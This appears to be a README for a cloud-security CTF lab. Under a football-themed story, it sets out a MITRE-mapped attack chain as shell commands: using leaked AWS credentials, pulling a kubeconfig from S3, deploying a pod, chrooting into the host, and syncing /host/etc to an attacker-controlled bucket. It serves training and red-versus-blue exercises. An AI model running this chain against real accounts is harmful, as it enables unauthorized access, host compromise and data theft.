# Essential Tools to Win Magic CTF

## cloudcreds2exfil – Cloud Security Simulation

**Disclaimer:**  
This repository is for **educational use only** in authorized environments such as CTFs, cloud labs, or security training ranges. Do not use any part of this project on real systems without permission.

---

## Overview

The match was meant to be routine, until someone on the team leaked the game plan. An unexpected player slipped in, disguised and unmarked. What followed was a silent play, moving past the midfield, breaching the last line, and walking the ball into the net. By the time the Avengers noticed, the scoreboard had already changed.

---

## Attack Chain Simulation

---

## Commands & Mapping

### Step 1: Something was left unlocked
The first clue lies in plain sight - configure, but don’t question.

Use the credentials to authenticate via AWS CLI.

**MITRE ATT&CK:**  
T1528 – Steal Application Access Token  
T1552.001 – Unprotected Credentials in Files

```bash
aws configure
aws sts get-caller-identity
```

---

### Step 2: They stored more than just objects
What’s in the box may not be just files. Look deeper.

List available buckets and explore their contents. Look for sensitive data like configuration files.

**MITRE ATT&CK:**  
T1530 – Data from Cloud Storage Object  
T1083 – File and Directory Discovery

```bash
aws s3 ls
aws s3 ls s3://<bucket-name>
aws s3 sync s3://<bucket-name> ./downloaded-data
```

---

### Step 3: You now speak its language
You’ve found the map. It doesn’t shout - but it guides.

**MITRE ATT&CK:**  
T1592.002 – Gather Cloud Infra Config: Container Orchestration  
T1609 – Kubernetes API Access

```bash
export KUBECONFIG=downloaded-data/kubeconfig
kubectl get nodes
kubectl get pods -A
```

---

### Step 4: Walk among them

Disguised as one of their own, you enter the field.

**MITRE ATT&CK:**  
T1610 – Deploy Container  
T1611 – Escape to Host

```bash
kubectl apply -f <<name>.yaml
kubectl get pods
kubectl exec -it <name> -- /bin/bash
```

---

### Step 5: Beyond the container wall

What lies beneath may not be hidden - only ignored.

**MITRE ATT&CK:**  
T1057 – Process Discovery  
T1082 – System Information Discovery

```bash
ls /host
chroot /host
hostname
```

---

### Step 6: Leave nothing... or leave everything
If you must leave, take a souvenir. Just don’t leave a trace.

**MITRE ATT&CK:**  
T1537 – Transfer Data to Cloud Account  
T1005 – Data from Local System  
T1041 – Exfiltration Over C2 Channel

```bash
aws s3 sync /host/etc s3://<your-exfil-bucket>/etc-backup
```

## Usage Guidelines

- Use only in test environments (e.g., personal AWS account, private CTFs, cyber ranges).
- Never use these techniques in production systems or without explicit permission.
- Designed for red vs. blue team simulations, training, and awareness.

---

## License

MIT License – Use allowed for educational and research purposes only.

---

## Contact

Open an issue or contact the maintainers for questions or suggestions.
